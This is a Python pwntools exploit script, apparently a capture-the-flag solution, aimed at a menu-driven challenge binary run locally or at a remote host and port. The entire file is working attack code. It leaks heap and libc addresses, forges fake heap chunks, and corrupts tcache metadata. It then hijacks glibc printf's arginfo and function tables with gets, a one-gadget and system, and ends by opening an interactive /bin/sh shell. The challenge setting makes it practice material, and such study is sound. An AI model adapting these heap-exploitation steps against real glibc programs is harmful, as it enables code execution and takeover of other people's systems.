from pwn import *
from subprocess import run

libc = ELF("./libc.so.6")

def convert(n):
    return run(["./convert", str(n)], capture_output=True).stdout

def setsave(n):
    global p
    p.sendlineafter(b"2) integer\n> ", b"1")
    p.sendlineafter(b"> ", b"1")
    conv = convert(n).strip()
    print(f"[+] sending {conv}")
    p.sendline(conv)
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", b"0")
    p.recvuntil(b"2) integer\n")

def exploit(gadget):
    global p
    if args.HOST and args.PORT:
        p = remote(args.HOST, args.PORT)
    else:
        p = process("../chal/chal", cwd="../chal")
    if args.GDB:
        context.terminal = ["kitty"]
        gdb.attach(p)
    
    p.sendlineafter(b"> ", b"1")
    for _ in range(7):
        p.sendlineafter(b"> ", b"1")
        p.sendline(b"0.0")
    p.sendlineafter(b"> ", b"0")

    p.sendlineafter(b"> ", b"2")
    for i, n in enumerate([0, 0, 0, 0, 0, 0x41]):
        p.sendlineafter(b"> ", b"1")
        p.sendline(str(i).encode())
        p.sendline(str(n).encode())
    p.sendlineafter(b"> ", b"8")
    p.sendlineafter(b"> ", b"0")

    p.sendlineafter(b"> ", b"1")
    for _ in range(7):
        p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", b"7")
    # leak
    p.recvuntil(b"-nan ")
    leak = int(p.readline())
    print(f"[+] leak: {leak:x}")
    p.sendlineafter(b"> ", b"0")

    heap = leak - 0x12f10
    print(f"[+] heap: {heap:x}")

    for i in range(15):
        setsave(0)
        p.sendlineafter(b"> ", b"2")
        p.sendlineafter(b"> ", b"8")
        p.sendlineafter(b"> ", b"0")

    fake = [0, 0x91] + [0] * 16 + [0, 0x91] + [0] * 16 + [0, 0x91]
    for i, n in enumerate(fake):
        if n == 0:
            continue
        setsave(heap + 0x12f10 + i * 8)
        p.sendlineafter(b"> ", b"2")
        p.sendlineafter(b"> ", b"1")
        p.sendline(b"0")
        p.sendline(str(n).encode())
        p.sendlineafter(b"> ", b"8")
        p.sendlineafter(b"> ", b"0")

    setsave(heap + 0x10)
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", b"1")
    p.sendline(b"1")
    p.sendline(str(0x0007000000000000).encode())
    p.sendlineafter(b"> ", b"8")
    p.sendlineafter(b"> ", b"0")

    victim = heap + 0x12f10 + 20 * 8
    print(f"[+] victim: {victim:x}")
    setsave(victim)
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", b"7")
    p.sendlineafter(b"> ", b"0")

    setsave(heap + 0x12f10 + 0x40 * 2)
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", b"7")

    p.sendlineafter(b"> ", b"2")
    p.sendline(b"5")
    leak = int(p.readline())
    base = leak - 0x219ce0

    print(f"[+] leak: {leak:x}")
    print(f"[+] base: {base:x}")

    p.sendlineafter(b"> ", b"0")

    arginfo = 0x21a8b0
    functions = 0x21b9c8

    setsave(base + arginfo)
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", b"1")
    p.sendline(b"0")
    p.sendline(str(heap + 0x12f10).encode())
    p.sendlineafter(b"> ", b"8")
    p.sendlineafter(b"> ", b"0")

    setsave(heap + 0x12f10 + ord('f') * 8)
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", b"1")
    p.sendline(b"0")
    p.sendline(str(base + libc.symbols["gets"]).encode())
    p.sendlineafter(b"> ", b"8")
    p.sendlineafter(b"> ", b"0")

    setsave(heap + 0x12f10 + ord('u') * 8)
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", b"1")
    p.sendline(b"0")
    p.sendline(str(base + 0x53b56).encode())
    p.sendlineafter(b"> ", b"8")
    p.sendlineafter(b"> ", b"0")

    setsave(heap + 0x12f10)
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", b"1")
    p.sendline(b"0")
    p.sendline(str(u64(b"/bin/sh\x00")).encode())
    p.sendlineafter(b"> ", b"8")
    p.sendlineafter(b"> ", b"0")

    setsave(base + functions)
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", b"1")
    p.sendline(b"0")
    p.sendline(b"1")
    p.sendlineafter(b"> ", b"8")
    p.sendlineafter(b"> ", b"0")

    p.sendlineafter(b"> ", b"1")
    ctx = [0 for _ in range(32)]
    ctx[0xa8//8] = base + libc.symbols["system"]
    ctx[0x68//8] = heap + 0x12f10
    attack = b"7" + b"A" * 124 + flat(ctx, word_size=64)
    p.sendlineafter(b"> ", attack)

    p.interactive()
    p.close()

exploit(None)